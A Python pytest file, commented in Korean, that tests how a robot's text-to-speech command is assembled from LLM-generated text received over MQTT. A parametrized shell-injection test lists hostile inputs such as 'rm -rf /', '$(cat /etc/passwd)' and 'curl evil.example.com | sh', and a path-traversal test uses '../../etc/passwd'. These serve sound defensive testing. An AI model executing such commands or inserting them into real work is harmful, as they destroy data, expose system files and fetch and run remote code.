"""음성 합성 명령 조립 검증.

가장 중요한 것은 셸 주입 방어입니다. 로봇이 말할 문장은 서버 LLM 이
만들어 MQTT 로 내려오는 외부 문자열입니다.
"""

import pytest

from potner_base.speech import (
    DEFAULT_COMMAND,
    TEXT_PLACEHOLDER,
    build_command,
    normalize_text,
    wav_filename,
)


def test_자리표시자에_문장이_들어간다():
    argv = build_command(["espeak-ng", "-v", "ko", TEXT_PLACEHOLDER], "안녕하세요")
    assert argv == ["espeak-ng", "-v", "ko", "안녕하세요"]


def test_공백이_있어도_인자_하나로_유지된다():
    """쪼개지면 TTS 가 첫 단어만 읽거나 나머지를 옵션으로 오해합니다."""
    argv = build_command(["say", TEXT_PLACEHOLDER], "다녀오셨어요 오늘도 잘 지냈어요")
    assert len(argv) == 2
    assert argv[1] == "다녀오셨어요 오늘도 잘 지냈어요"


@pytest.mark.parametrize(
    "malicious",
    [
        "안녕; rm -rf /",
        '"; shutdown -h now; echo "',
        "$(cat /etc/passwd)",
        "`whoami`",
        "안녕 && curl evil.example.com | sh",
        "test | tee /tmp/pwned",
    ],
)
def test_셸_메타문자가_섞여도_인자_하나로_남는다(malicious):
    """실제 방어는 shell=True 를 쓰지 않는 것이고, 여기서는 문장이
    쪼개지거나 해석되지 않고 그대로 전달되는지를 확인합니다."""
    argv = build_command(["espeak-ng", TEXT_PLACEHOLDER], malicious)

    assert argv == ["espeak-ng", malicious]
    assert len(argv) == 2


def test_자리표시자가_없으면_거부한다():
    with pytest.raises(ValueError, match="자리표시자"):
        build_command(["espeak-ng", "-v", "ko"], "안녕")


def test_빈_명령을_거부한다():
    with pytest.raises(ValueError, match="비어"):
        build_command([], "안녕")


def test_기본_명령에는_자리표시자가_있다():
    """기본값이 잘못되어 있으면 노드가 시작하자마자 아무 말도 못 합니다."""
    assert TEXT_PLACEHOLDER in DEFAULT_COMMAND
    assert build_command(DEFAULT_COMMAND, "테스트")[-1] == "테스트"


def test_줄바꿈과_중복_공백을_정리한다():
    """TTS 엔진이 줄바꿈을 문장 끝으로 오해합니다."""
    assert normalize_text("안녕\n하세요") == "안녕 하세요"
    assert normalize_text("  여백   많은   문장  ") == "여백 많은 문장"


def test_너무_긴_문장은_자른다():
    """LLM 이 긴 답을 보내면 로봇이 몇 분 동안 혼자 떠듭니다."""
    result = normalize_text("가" * 500, max_length=100)
    assert len(result) <= 103  # 잘린 표시 '...' 포함
    assert result.endswith("...")


def test_짧은_문장은_건드리지_않는다():
    assert normalize_text("짧음", max_length=100) == "짧음"


def test_한글_파일명이_유지된다():
    """한글은 isalnum() 이 True 라 그대로 남아야 합니다."""
    assert wav_filename("다녀오셨어요") == "다녀오셨어요.wav"


def test_파일명에_경로_문자가_섞이지_않는다():
    """문장이 외부에서 오므로 경로 탈출을 막아야 합니다."""
    name = wav_filename("../../etc/passwd")
    assert "/" not in name
    assert ".." not in name
    assert name.endswith(".wav")
